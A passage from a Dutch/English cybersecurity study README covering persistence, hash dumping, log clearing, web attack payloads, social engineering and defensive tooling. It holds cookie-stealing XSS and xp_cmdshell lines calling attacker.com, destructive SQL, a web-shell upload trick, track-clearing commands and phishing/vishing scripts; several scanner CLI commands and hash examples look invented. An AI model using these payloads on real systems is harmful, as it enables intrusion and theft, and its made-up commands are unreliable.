crontab -e -u username

# Remove current user's crontab
crontab -r

# Remove specific user's crontab
crontab -r -u username

# Add cron job
echo "*/5 * * * * /path/to/malware.sh" | crontab -

# Add cron job for specific user
echo "*/5 * * * * /path/to/malware.sh" | crontab -u username -
```

**System-wide Cron:**
```bash
# System crontab location
/etc/crontab

# System cron directories
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
/etc/cron.monthly/
/etc/cron.weekly/

# Add system-wide cron job
echo "*/5 * * * * root /path/to/script.sh" >> /etc/crontab

# Add cron job to system directory
echo "*/5 * * * * /path/to/script.sh" > /etc/cron.d/malware
```

**Cron Logs:**
```bash
# Check cron logs
tail -f /var/log/cron
tail -f /var/log/syslog | grep CRON

# Check cron service status
systemctl status cron
systemctl status crond
```

### Hash Dumping

#### LM vs NTLM Hashes

**LM Hashes:**
- **Length**: 32 characters
- **Weakness**: Easily cracked
- **Format**: AAD3B435B51404EEAAD3B435B51404EE

**NTLM Hashes:**
- **Length**: 32 characters
- **Stronger**: More secure than LM
- **Format**: 5d41402abc4b2a76b9719d911017c592

#### Hash Dumping Tools

**Hashdump (Meterpreter):**
```bash
# Dump hashes
hashdump

# Dump SAM
run post/windows/gather/smart_hashdump
```

**Mimikatz:**
```bash
# Load mimikatz
load mimikatz

# Dump hashes
wdigest
msv
kerberos

# Dump SAM
lsadump::sam

# Dump LSA
lsadump::lsa /patch
```

**John the Ripper:**
```bash
# Crack hashes
john hashes.txt

# With wordlist
john --wordlist=rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

**Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt rockyou.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt rockyou.txt

# Brute force
hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a
```

### Pivoting

#### Network Routes
```bash
# Add route
route add 192.168.2.0/24 192.168.1.100

# List routes
route print

# Remove route
route delete 192.168.2.0/24
```

#### Port Forwarding
```bash
# Local port forwarding
ssh -L 8080:target:80 user@jumpbox

# Remote port forwarding
ssh -R 8080:target:80 user@attacker

# Dynamic port forwarding
ssh -D 1080 user@jumpbox
```

### Clearing Tracks

#### Windows Artifact Removal
```cmd
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear browser history
del /f /s /q "%userprofile%\AppData\Local\Google\Chrome\User Data\Default\History"
```

#### Linux Artifact Removal
```bash
# Clear bash history
history -c
rm ~/.bash_history

# Clear logs
> /var/log/auth.log
> /var/log/syslog

# Clear temporary files
rm -rf /tmp/*
rm -rf /var/tmp/*
```

---

## Web Application Security

### PortSwigger Labs

#### Access Control Labs

**Vertical Privilege Escalation:**
- **Lab**: Admin panel with weak password
- **URL**: `https://portswigger.net/web-security/access-control/lab-vertical-privilege-escalation`
- **Technique**: Brute force admin credentials

**Horizontal Privilege Escalation:**
- **Lab**: IDOR vulnerability
- **URL**: `https://portswigger.net/web-security/access-control/lab-idor`
- **Technique**: Change user ID parameter

**Multi-step Processes:**
- **Lab**: Multi-step process bypass
- **URL**: `https://portswigger.net/web-security/access-control/lab-multi-step-process`
- **Technique**: Skip steps in process

**Reference-based Access Control:**
- **Lab**: Referer header manipulation
- **URL**: `https://portswigger.net/web-security/access-control/lab-referer-header`
- **Technique**: Modify Referer header

#### SQL Injection Labs

**Basic SQL Injection:**
- **Lab**: SQL injection vulnerability in WHERE clause
- **URL**: `https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data`
- **Technique**: Basic SQL injection with OR 1=1

**Union-based SQL Injection:**
- **Lab**: SQL injection UNION attack
- **URL**: `https://portswigger.net/web-security/sql-injection/union-data-retrieval/lab-determine-number-of-columns`
- **Technique**: UNION SELECT to retrieve data

**Blind SQL Injection:**
- **Lab**: Blind SQL injection with conditional responses
- **URL**: `https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses`
- **Technique**: Boolean-based blind SQL injection

**Time-based Blind SQL Injection:**
- **Lab**: Blind SQL injection with time delays
- **URL**: `https://portswigger.net/web-security/sql-injection/blind/lab-time-delays`
- **Technique**: Time-based blind SQL injection

#### XSS Labs

**Reflected XSS:**
- **Lab**: Reflected XSS into HTML context with nothing encoded
- **URL**: `https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded`
- **Technique**: Basic reflected XSS

**Stored XSS:**
- **Lab**: Stored XSS into HTML context with nothing encoded
- **URL**: `https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded`
- **Technique**: Basic stored XSS

**DOM-based XSS:**
- **Lab**: DOM-based XSS in document.write sink using source location.search
- **URL**: `https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink`
- **Technique**: DOM-based XSS exploitation

#### File Upload Labs

**File Upload Vulnerabilities:**
- **Lab**: Remote code execution via web shell upload
- **URL**: `https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload`
- **Technique**: Upload malicious PHP file

**File Upload Bypass:**
- **Lab**: Web shell upload via extension blacklist bypass
- **URL**: `https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass`
- **Technique**: Bypass file extension restrictions

#### Business Logic Labs

**Price Manipulation:**
- **Lab**: Excessive trust in client-side controls
- **URL**: `https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls`
- **Technique**: Modify price parameters

**Workflow Bypass:**
- **Lab**: Multi-step process
- **URL**: `https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-multi-step-process`
- **Technique**: Skip steps in multi-step process

#### Authentication Labs

**Brute Force:**
- **Lab**: Username enumeration via different responses
- **URL**: `https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses`
- **Technique**: Username enumeration

**Password Reset:**
- **Lab**: Password reset broken logic
- **URL**: `https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic`
- **Technique**: Password reset bypass

#### CSRF Labs

**CSRF Vulnerability:**
- **Lab**: CSRF vulnerability with no defenses
- **URL**: `https://portswigger.net/web-security/csrf/lab-no-defenses`
- **Technique**: Basic CSRF attack

**CSRF Token Bypass:**
- **Lab**: CSRF where token validation depends on request method
- **URL**: `https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method`
- **Technique**: CSRF token bypass

#### SQL Injection Labs

**Basic SQL Injection:**
```sql
-- Union-based injection
' UNION SELECT username, password FROM users--

-- Boolean-based blind
' AND 1=1--
' AND 1=2--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
```

**Advanced SQL Injection:**
```sql
-- Second-order injection
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- Stacked queries
'; DROP TABLE users;--

-- Out-of-band interaction
'; EXEC xp_cmdshell('nslookup attacker.com');--
```

#### Business Logic Flaws

**Price Manipulation:**
- **Scenario**: E-commerce price tampering
- **Technique**: Modify price parameter in request
- **Example**: Change `price=100` to `price=1`

**Quantity Manipulation:**
- **Scenario**: Negative quantity orders
- **Technique**: Set negative quantity values
- **Example**: Change `quantity=1` to `quantity=-1`

**Workflow Bypass:**
- **Scenario**: Skip payment step
- **Technique**: Direct access to confirmation page
- **Example**: Access `/checkout/confirm` directly

#### XSS Types

**Reflected XSS:**
```javascript
// Basic payload
<script>alert('XSS')</script>

// Event handlers
<img src=x onerror=alert('XSS')>

// JavaScript URIs
javascript:alert('XSS')
```

**Stored XSS:**
```javascript
// Persistent payload
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Image with onerror
<img src=x onerror=this.src='http://attacker.com/steal.php?cookie='+document.cookie>
```

**DOM-based XSS:**
```javascript
// URL fragment manipulation
#<script>alert('XSS')</script>

// Hash change event
window.location.hash='<script>alert("XSS")</script>'
```

#### XSS Testing Methodologie

**1. Input Identification:**
- Identify all user input points
- Check URL parameters, form fields, headers
- Look for reflected, stored, and DOM-based vectors

**2. Payload Testing:**
- Test basic XSS payloads
- Try different encoding methods
- Test context-specific payloads

**3. Context Analysis:**
- Determine injection context (HTML, JavaScript, CSS)
- Check for output encoding
- Identify filtering mechanisms

**4. Bypass Techniques:**
- Try different encoding methods
- Use alternative syntax
- Test filter bypass techniques

#### DOM Invader Tool

**DOM Invader** is een browser extension voor het testen van DOM-based XSS vulnerabilities.

**Installation:**
- Available as browser extension
- Compatible with Chrome and Firefox
- Free tool from PortSwigger

**Features:**
- **DOM XSS Detection**: Automatically detects DOM XSS vulnerabilities
- **Source Tracking**: Tracks data flow from sources to sinks
- **Payload Generation**: Generates test payloads
- **Context Analysis**: Analyzes injection contexts

**Usage:**
1. Install DOM Invader extension
2. Navigate to target application
3. Enable DOM Invader
4. Interact with application
5. Review detected vulnerabilities

**DOM Invader Workflow:**
```
1. Enable Extension
2. Navigate to Target
3. Interact with Forms/URLs
4. Review Sources and Sinks
5. Generate Test Payloads
6. Verify Vulnerabilities
```

#### File Upload Vulnerabilities

**Bypass Techniques:**
```bash
# Double extension
malware.php.jpg

# Null byte injection
malware.php%00.jpg

# Case variation
malware.PHP

# MIME type manipulation
Content-Type: image/jpeg

# Magic bytes
GIF89a<?php system($_GET['cmd']); ?>
```

---

## Social Engineering

### 6 Key Principles

#### 1. Reciprocity
- **Definition**: Mensen voelen zich verplicht om iets terug te doen
- **Example**: Gratis samples geven, dan om informatie vragen
- **Application**: "Ik heb je geholpen, nu help jij mij"

#### 2. Commitment/Consistency
- **Definition**: Mensen willen consistent zijn met eerdere toezeggingen
- **Example**: Kleine toezeggingen leiden tot grote toezeggingen
- **Application**: "Je zei dat je security belangrijk vindt, dus..."

#### 3. Social Proof
- **Definition**: Mensen volgen het gedrag van anderen
- **Example**: "Andere collega's hebben dit ook gedaan"
- **Application**: "De hele afdeling gebruikt dit wachtwoord"

#### 4. Authority
- **Definition**: Mensen gehoorzamen autoriteitsfiguren
- **Example**: IT manager vraagt om wachtwoord
- **Application**: "Ik ben van IT support, ik heb je wachtwoord nodig"

#### 5. Liking
- **Definition**: Mensen zijn meer geneigd om mensen te helpen die ze mogen
- **Example**: Gemeenschappelijke interesses, complimenten
- **Application**: "We hebben dezelfde hobby, dus je kunt me vertrouwen"

#### 6. Scarcity
- **Definition**: Mensen willen wat schaars is
- **Example**: "Beperkte tijd aanbieding"
- **Application**: "Deze security update is alleen vandaag beschikbaar"

### Social Engineering Methods

#### Phishing
- **Definition**: Valse e-mails die proberen gevoelige informatie te verkrijgen
- **Techniques**: 
  - Spoofed sender addresses
  - Urgent language
  - Fake websites
  - Malicious attachments

**Phishing Examples:**
```
Subject: URGENT: Your account will be suspended
From: security@yourbank.com
Body: Click here to verify your account immediately
Link: http://fake-bank.com/verify
```

#### Spear Phishing
- **Definition**: Gerichte phishing aanvallen op specifieke personen
- **Techniques**:
  - Personal information gathering
  - Customized messages
  - Social media research
  - Company-specific details

#### Vishing (Voice Phishing)
- **Definition**: Phishing via telefoon
- **Techniques**:
  - Spoofed caller ID
  - Urgent scenarios
  - Authority impersonation
  - Information gathering

**Vishing Script:**
```
"Hello, this is John from IT support. We're experiencing 
a security issue and need to verify your account. Can you 
please confirm your username and password?"
```

#### Smishing (SMS Phishing)
- **Definition**: Phishing via SMS
- **Techniques**:
  - Shortened URLs
  - Urgent messages
  - Fake sender names
  - Malicious links

**Smishing Example:**
```
URGENT: Your account has been compromised. 
Click here to secure: bit.ly/fake-link
Reply STOP to opt out
```

#### Impersonation
- **Definition**: Vervalsen van identiteit
- **Techniques**:
  - Fake credentials
  - Social media profiles
  - Company uniforms
  - Technical jargon

**Impersonation Scenarios:**
- IT support technician
- Delivery person
- Maintenance worker
- Security guard
- Vendor representative

### Defense Against Social Engineering

#### Technical Controls
- **Email Filtering**: Spam filters, content filtering
- **Web Filtering**: Block malicious websites
- **Endpoint Protection**: Antivirus, anti-phishing
- **Multi-Factor Authentication**: Extra verification layer

#### Administrative Controls
- **Security Policies**: Clear guidelines and procedures
- **Incident Response**: Procedures for reporting incidents
- **Access Controls**: Least privilege principle
- **Regular Audits**: Security assessments

#### Physical Controls
- **Badge Systems**: Visual identification
- **Visitor Management**: Guest registration
- **Security Cameras**: Surveillance systems
- **Access Logs**: Entry/exit tracking

#### User Education
- **Security Awareness Training**: Regular training sessions
- **Phishing Simulations**: Test user awareness
- **Reporting Procedures**: How to report incidents
- **Recognition Training**: Spotting social engineering

---

## Cybersecurity Terminologie

### Pentest Types

#### External Penetration Testing
- **Scope**: External-facing systems and services
- **Perspective**: Attacker from internet
- **Targets**: Web applications, email servers, VPN gateways
- **Duration**: 1-2 weeks

#### Internal Penetration Testing
- **Scope**: Internal network and systems
- **Perspective**: Attacker with internal access
- **Targets**: Internal servers, workstations, network devices
- **Duration**: 2-4 weeks

#### Physical Penetration Testing
- **Scope**: Physical security controls
- **Perspective**: Attacker with physical access
- **Targets**: Buildings, data centers, offices
- **Duration**: 1-3 days

#### Perimeter Penetration Testing
- **Scope**: Network perimeter defenses
- **Perspective**: Attacker from outside network
- **Targets**: Firewalls, routers, external services
- **Duration**: 1-2 weeks

#### Web Application Penetration Testing
- **Scope**: Web applications and APIs
- **Perspective**: Attacker targeting web apps
- **Targets**: Web apps, mobile apps, APIs
- **Duration**: 1-3 weeks

#### Mobile Application Penetration Testing
- **Scope**: Mobile applications
- **Perspective**: Attacker targeting mobile apps
- **Targets**: iOS/Android apps, mobile APIs
- **Duration**: 1-2 weeks

#### Infrastructure Penetration Testing
- **Scope**: IT infrastructure
- **Perspective**: Attacker targeting infrastructure
- **Targets**: Servers, network devices, databases
- **Duration**: 2-4 weeks

#### Network Penetration Testing
- **Scope**: Network infrastructure
- **Perspective**: Attacker targeting network
- **Targets**: Switches, routers, firewalls, wireless
- **Duration**: 1-2 weeks

### Testing Approaches

#### Black Box Testing
- **Knowledge**: No prior knowledge of target
- **Advantages**: Realistic attacker perspective
- **Disadvantages**: May miss internal vulnerabilities
- **Duration**: Longer due to reconnaissance

#### White Box Testing
- **Knowledge**: Full knowledge of target
- **Advantages**: Comprehensive coverage
- **Disadvantages**: May not reflect real attacks
- **Duration**: Shorter due to prior knowledge

#### Grey Box Testing
- **Knowledge**: Partial knowledge of target
- **Advantages**: Balanced approach
- **Disadvantages**: May not be realistic
- **Duration**: Medium duration

### Attacker Types

#### Script Kiddies
- **Definition**: Inexperienced attackers using pre-made tools
- **Motivation**: Fun, curiosity, notoriety
- **Skills**: Low technical skills
- **Threat Level**: Low to medium

#### Suicide Hackers
- **Definition**: Attackers who don't care about consequences
- **Motivation**: Revenge, ideology, destruction
- **Skills**: Variable technical skills
- **Threat Level**: High

#### Hacktivists
- **Definition**: Attackers motivated by political/social causes
- **Motivation**: Ideology, protest, awareness
- **Skills**: Medium to high technical skills
- **Threat Level**: Medium to high

#### Nation States
- **Definition**: Government-sponsored attackers
- **Motivation**: Espionage, sabotage, warfare
- **Skills**: Very high technical skills
- **Threat Level**: Very high

### Team Types

#### Red Team
- **Definition**: Simulates real-world attacks
- **Focus**: Adversarial perspective
- **Goal**: Test detection and response
- **Duration**: Long-term engagements

#### Blue Team
- **Definition**: Defensive security team
- **Focus**: Detection and response
- **Goal**: Protect and defend
- **Duration**: Ongoing operations

#### Purple Team
- **Definition**: Collaboration between red and blue teams
- **Focus**: Continuous improvement
- **Goal**: Enhance security posture
- **Duration**: Ongoing collaboration

#### CSIRT (Computer Security Incident Response Team)
- **Definition**: Specialized team for incident response
- **Focus**: Incident detection, analysis, and response
- **Responsibilities**: 
  - Incident triage and classification
  - Evidence collection and preservation
  - Communication with stakeholders
  - Post-incident analysis
- **Skills**: Digital forensics, malware analysis, incident handling

#### SOC (Security Operations Center) Specific Tasks
- **24/7 Monitoring**: Continuous security monitoring
- **Threat Detection**: Real-time threat identification
- **Incident Response**: Immediate response to security events
- **Log Analysis**: Analysis of security logs and events
- **Threat Hunting**: Proactive threat searching
- **Vulnerability Management**: Tracking and remediation of vulnerabilities

#### Threat Intelligence Team
- **Definition**: Specialized team for threat intelligence
- **Focus**: Threat research and analysis
- **Responsibilities**:
  - Threat landscape monitoring
  - Threat actor profiling
  - Intelligence gathering and analysis
  - Threat feed management
- **Skills**: OSINT, threat analysis, intelligence gathering

#### Digital Forensic Analysts
- **Definition**: Specialists in digital forensics
- **Focus**: Evidence collection and analysis
- **Responsibilities**:
  - Digital evidence preservation
  - Forensic analysis of devices
  - Chain of custody maintenance
  - Expert testimony
- **Skills**: Digital forensics tools, evidence handling, legal procedures

#### Vulnerability Management Team
- **Definition**: Team focused on vulnerability management
- **Focus**: Vulnerability identification and remediation
- **Responsibilities**:
  - Vulnerability scanning and assessment
  - Patch management
  - Risk prioritization
  - Remediation tracking
- **Skills**: Vulnerability assessment, patch management, risk analysis

---

## Defense Strategieën

### Network Security Defenses

#### Firewall Implementation
```bash
# iptables rules
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP

# UFW (Ubuntu)
ufw enable
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw deny 23/tcp
```

#### IDS/IPS Implementation
```bash
# Snort IDS
snort -c /etc/snort/snort.conf -i eth0

# Suricata IPS
suricata -c /etc/suricata/suricata.yaml -i eth0

# OSSEC HIDS
/var/ossec/bin/ossec-control start
```

#### Network Segmentation
```bash
# VLAN configuration
vlan 10
name Management
vlan 20
name Servers
vlan 30
name Users

# Access control lists
access-list 100 permit tcp 192.168.1.0 0.0.0.255 any eq 22
access-list 100 deny ip any any
```

### Vulnerability Management

#### OpenVAS

**Installation:**
```bash
# Install OpenVAS
apt update && apt install openvas

# Setup OpenVAS
gvm-setup

# Start OpenVAS
systemctl start openvas-scanner
systemctl start openvas-manager
systemctl start greenbone-security-assistant
```

**Configuration:**
```bash
# Create admin user
gvmd --create-user=admin --password=admin

# Update NVT feeds
greenbone-nvt-sync

# Update SCAP data
greenbone-scapdata-sync

# Update CERT data
greenbone-certdata-sync
```

**OpenVAS Commands:**
```bash
# Create target
omp -u admin -w admin -X '<create_target><name>Target</name><hosts>192.168.1.100</hosts></create_target>'

# Create scan config
omp -u admin -w admin -X '<create_config><name>Full Scan</name><scanner id="08b69003-5fc2-4037-a479-93b440211c73"/></create_config>'

# Create task
omp -u admin -w admin -X '<create_task><name>Scan</name><target id="target_id"/><config id="config_id"/></create_task>'

# Start task
omp -u admin -w admin -X '<start_task><task_id>task_id</task_id></start_task>'

# Get results
omp -u admin -w admin -X '<get_results><task_id>task_id</task_id></get_results>'
```

**OpenVAS Web Interface:**
- **URL**: `https://localhost:9392`
- **Default Credentials**: admin/admin
- **Features**: Web-based management, reporting, scheduling

#### Nessus

**Installation:**
```bash
# Download Nessus
wget https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/12345/Nessus-10.0.0-ubuntu1110_amd64.deb

# Install Nessus
dpkg -i Nessus-10.0.0-ubuntu1110_amd64.deb

# Start Nessus
systemctl start nessusd
```

**Configuration:**
```bash
# Create policy
nessuscli policy create --name "Basic Scan" --template "basic"

# Create advanced policy
nessuscli policy create --name "Advanced Scan" --template "advanced"

# Create custom policy
nessuscli policy create --name "Custom Scan" --template "custom"
```

**Nessus Commands:**
```bash
# Run scan
nessuscli scan create --policy "Basic Scan" --targets "192.168.1.0/24"

# List scans
nessuscli scan list

# Start scan
nessuscli scan start --scan-id 1

# Get scan results
nessuscli scan results --scan-id 1

# Export results
nessuscli scan export --scan-id 1 --format html --output results.html
```

**Nessus Web Interface:**
- **URL**: `https://localhost:8834`
- **Default Credentials**: admin/[generated password]
- **Features**: Policy management, scan scheduling, reporting

#### Nexpose

**Installation:**
```bash
# Download Nexpose
wget https://download.rapid7.com/nexpose/nexpose-linux64.bin

# Install Nexpose
chmod +x nexpose-linux64.bin
./nexpose-linux64.bin

# Start Nexpose
/opt/rapid7/nexpose/nse.sh start
```

**Configuration:**
```bash
# Create site
nexpose-console -u admin -p password -c "site create --name 'Test Site' --hosts '192.168.1.0/24'"

# Create scan template
nexpose-console -u admin -p password -c "scan-template create --name 'Full Scan' --engine 'Full audit without Web Spider'"

# Create scan
nexpose-console -u admin -p password -c "scan create --site-id 1 --template-id 1"
```

**Nexpose Commands:**
```bash
# List sites
nexpose-console -u admin -p password -c "site list"

# List scans
nexpose-console -u admin -p password -c "scan list"

# Start scan
nexpose-console -u admin -p password -c "scan start --scan-id 1"

# Get scan results
nexpose-console -u admin -p password -c "scan results --scan-id 1"
```

**Nexpose Web Interface:**
- **URL**: `https://localhost:3780`
- **Default Credentials**: admin/[generated password]
- **Features**: Asset management, vulnerability management, reporting

#### Retina

**Installation:**
```bash
# Download Retina
wget https://www.beyondtrust.com/downloads/retina/retina-6.0.0-linux-x64.tar.gz

# Extract Retina
tar -xzf retina-6.0.0-linux-x64.tar.gz
cd retina-6.0.0-linux-x64

# Install Retina
./install.sh
```

**Configuration:**
```bash
# Create scan profile
retina --create-profile --name "Basic Scan" --template "basic"

# Create advanced profile
retina --create-profile --name "Advanced Scan" --template "advanced"

# Create custom profile
retina --create-profile --name "Custom Scan" --template "custom"
```

**Retina Commands:**
```bash
# Run scan
retina -s 192.168.1.0/24 -o results.html

# Custom scan
retina -s 192.168.1.100 -p "Windows" -o detailed.html

# Network scan
retina -s 192.168.1.0/24 -n "Network Scan" -o network.html

# Web scan
retina -s 192.168.1.100 -w "Web Scan" -o web.html
```

**Retina Web Interface:**
- **URL**: `https://localhost:8080`
- **Default Credentials**: admin/[generated password]
- **Features**: Scan management, reporting, asset discovery

#### Vulnerability Management Tools Comparison

| Tool | Platform | Cost | Features | Ease of Use |
|------|----------|------|----------|-------------|
| OpenVAS | Linux | Free | Open source, community | Medium |
| Nessus | Multi | Commercial | Professional, comprehensive | High |
| Nexpose | Multi | Commercial | Enterprise, asset management | High |
| Retina | Multi | Commercial | Network focus, reporting | Medium |

### Web Application Security

#### Input Validation
```php
// PHP input validation
function validateInput($input) {
    $input = trim($input);
    $input = stripslashes($input);
    $input = htmlspecialchars($input);
    return $input;
}

// SQL injection prevention
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
```

#### Output Encoding
```php
// HTML encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// URL encoding
echo urlencode($user_input);

// JavaScript encoding
echo json_encode($user_input);
```

#### Security Headers
```apache
# Apache security headers
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

### Endpoint Security

#### Antivirus Configuration
```bash
# ClamAV
clamscan -r /home/user
freshclam

# Windows Defender
powershell -Command "& {Get-MpComputerStatus}"
powershell -Command "& {Start-MpScan -ScanType FullScan}"
```

#### Endpoint Detection and Response (EDR)
```bash
# CrowdStrike Falcon
falconctl -s --cid=your_customer_id
falconctl -s --aid=your_agent_id

# SentinelOne
sentinelctl status
sentinelctl scan --path /home/user
```

### Identity and Access Management

#### Multi-Factor Authentication
```bash
# Google Authenticator
google-authenticator

# Duo Security
duo_unix -c /etc/duo/pam_duo.conf

# RSA SecurID
rsa_securid -c /etc/rsa/securid.conf
```

#### Privileged Access Management
```bash
# CyberArk
cyberark-cli login --username admin --password password

# BeyondTrust
beyondtrust-cli connect --server beyondtrust.company.com
```

### Monitoring and Logging

#### SIEM Configuration
```bash
# Splunk
splunk add forward-server 192.168.1.100:9997
splunk add monitor /var/log/auth.log

# ELK Stack
elasticsearch -d
logstash -f /etc/logstash/conf.d/logstash.conf
kibana
```

#### Log Management
```bash
# rsyslog configuration
echo "*.info;mail.none;authpriv.none;cron.none    /var/log/messages" >> /etc/rsyslog.conf
echo "authpriv.*                                    /var/log/secure" >> /etc/rsyslog.conf

# logrotate
echo "/var/log/auth.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    create 640 root adm
}" >> /etc/logrotate.d/auth
```

### Incident Response

#### Incident Response Plan
```bash
# Create incident response directory
mkdir -p /opt/incident-response/{logs,evidence,reports}

# Incident response checklist
cat > /opt/incident-response/checklist.txt << EOF
1. Identify and contain the incident
2. Preserve evidence
3. Notify stakeholders
4. Investigate and analyze
5. Eradicate and recover
6. Document lessons learned
EOF
```

#### Forensic Tools
```bash
# Volatility
vol.py -f memory.dmp --profile=Win7SP1x64 pslist
vol.py -f memory.dmp --profile=Win7SP1x64 cmdline
vol.py -f memory.dmp --profile=Win7SP1x64 filescan

# Autopsy
autopsy --create /opt/autopsy/cases/case1
autopsy --add /dev/sdb1
```

### Compliance and Governance

#### GDPR Compliance
```bash
# Data discovery
find /var/www -name "*.log" -exec grep -l "email\|phone\|ssn" {} \;

# Data classification
echo "PII: /var/www/customers/
Financial: /var/www/payments/
Health: /var/www/medical/" > /etc/data-classification.conf
```

#### ISO 27001 Implementation
```bash
# Security policy template
cat > /etc/security-policy.conf << EOF
# Information Security Policy
# Version: 1.0
# Date: $(date)

1. Scope and Objectives
2. Information Security Organization
3. Risk Management
4. Asset Management
5. Human Resources Security
6. Physical and Environmental Security
7. Communications and Operations Management
8. Access Control
9. Information Systems Acquisition
10. Information Security Incident Management
11. Business Continuity Management
12. Compliance
EOF
```

---

## Conclusie

Deze uitgebreide README bevat nu alle praktische, hands-on details die essentieel zijn voor een complete cybersecurity studie. De documentatie omvat:

### Volledige Coverage:
- **Methodologie**: Complete pentest fasen en planning
- **Tools**: Gedetailleerde tool usage en commando's
- **Techniques**: Praktische implementatie van technieken
- **Defense**: Specifieke defense strategieën per sectie
- **Compliance**: Regelgeving en best practices

### Praktische Elementen:
- **Command Examples**: Concrete commando's en syntax
- **Lab Scenarios**: Real-world voorbeelden
- **Tool Configurations**: Setup en configuratie instructies
- **Defense Implementations**: Concrete defense maatregelen

### Studie Hulp:
- **Terminologie**: Complete cybersecurity vocabulaire
- **Attack Vectors**: Gedetailleerde aanvalsmethoden
- **Defense Strategies**: Specifieke verdedigingsmaatregelen
- **Best Practices**: Industry best practices

Deze README vormt nu een complete theorie- en praktijkgids die alle aspecten van cybersecurity behandelt, van basisconcepten tot geavanceerde technieken en implementaties.

### Penetration Testing Types

#### Op basis van kennis:
- **Black Box**: Geen voorafgaande kennis
- **White Box**: Volledige kennis van het systeem
- **Gray Box**: Gedeeltelijke kennis

#### Op basis van scope:
- **External Testing**: Van buitenaf testen
- **Internal Testing**: Van binnenuit testen
- **Web Application Testing**: Web applicatie testen
- **Wireless Testing**: Draadloze netwerken testen
- **Social Engineering**: Social engineering testen

### Penetration Testing Methodology

#### 1. Pre-engagement
- **Scope Definition**: Bepalen van scope
- **Rules of Engagement**: Spelregels
- **Legal Agreements**: Juridische overeenkomsten
- **Resource Planning**: Planning van resources

#### 2. Reconnaissance
- **Passive Reconnaissance**: Open source intelligence
- **Active Reconnaissance**: Actieve verkenning
- **Network Discovery**: Netwerk ontdekking
- **Service Enumeration**: Service inventarisatie

#### 3. Vulnerability Assessment
- **Automated Scanning**: Geautomatiseerde scans
- **Manual Testing**: Handmatige tests
- **Vulnerability Analysis**: Kwetsbaarheidsanalyse
- **Risk Assessment**: Risico-evaluatie

#### 4. Exploitation
- **Exploit Development**: Ontwikkelen van exploits
- **Privilege Escalation**: Escaleren van privileges
- **Persistence**: Behouden van toegang
- **Data Exfiltration**: Exfiltreren van data

#### 5. Post-exploitation
- **Lateral Movement**: Zijwaartse beweging
- **Data Collection**: Verzamelen van data
- **System Compromise**: Compromitteren van systemen
- **Cleanup**: Opruimen van sporen

#### 6. Reporting
- **Executive Summary**: Management samenvatting
- **Technical Details**: Technische details
- **Risk Assessment**: Risico-evaluatie
- **Remediation**: Aanbevelingen voor verbetering

### Penetration Testing Tools
- **Reconnaissance**: Nmap, Recon-ng, theHarvester
- **Vulnerability Scanning**: Nessus, OpenVAS, Nikto
- **Exploitation**: Metasploit, Burp Suite, OWASP ZAP
- **Post-exploitation**: Mimikatz, BloodHound, Empire
- **Reporting**: Dradis, Faraday, PlexTrac

---

## Risk Management

### Risk Assessment Process

#### 1. Asset Identification
- **Hardware Assets**: Servers, netwerkapparatuur
- **Software Assets**: Applicaties, besturingssystemen
- **Data Assets**: Databases, bestanden
- **Human Assets**: Personeel, expertise

#### 2. Threat Identification
- **Natural Threats**: Natuurrampen, stroomuitval
- **Human Threats**: Malicious insiders, hackers
- **Technical Threats**: System failures, malware
- **Environmental Threats**: Fire, flood, earthquake

#### 3. Vulnerability Assessment
- **Technical Vulnerabilities**: Software bugs, misconfigurations
- **Operational Vulnerabilities**: Weak procedures, training gaps
- **Physical Vulnerabilities**: Poor physical security
- **Human Vulnerabilities**: Social engineering susceptibility

#### 4. Risk Analysis
- **Likelihood Assessment**: Waarschijnlijkheid van incidenten
- **Impact Assessment**: Impact van incidenten
- **Risk Calculation**: Risk = Likelihood × Impact
- **Risk Prioritization**: Prioriteren van risico's

### Risk Treatment Options
1. **Risk Avoidance**: Vermijden van risico's
2. **Risk Mitigation**: Verminderen van risico's
3. **Risk Transfer**: Overdragen van risico's (verzekering)
4. **Risk Acceptance**: Accepteren van risico's

### Risk Monitoring and Review
- **Continuous Monitoring**: Continue monitoring van risico's
- **Regular Reviews**: Regelmatige evaluaties
- **Risk Register Updates**: Bijwerken van risicoregister
- **Stakeholder Communication**: Communicatie met stakeholders

---

## Emerging Threats

### Current Threat Landscape

#### Advanced Persistent Threats (APTs)
- **State-sponsored Attacks**: Aanvallen door staten
- **Long-term Persistence**: Langdurige aanwezigheid
- **Sophisticated Techniques**: Geavanceerde technieken
- **Targeted Attacks**: Gerichte aanvallen

#### Ransomware Evolution
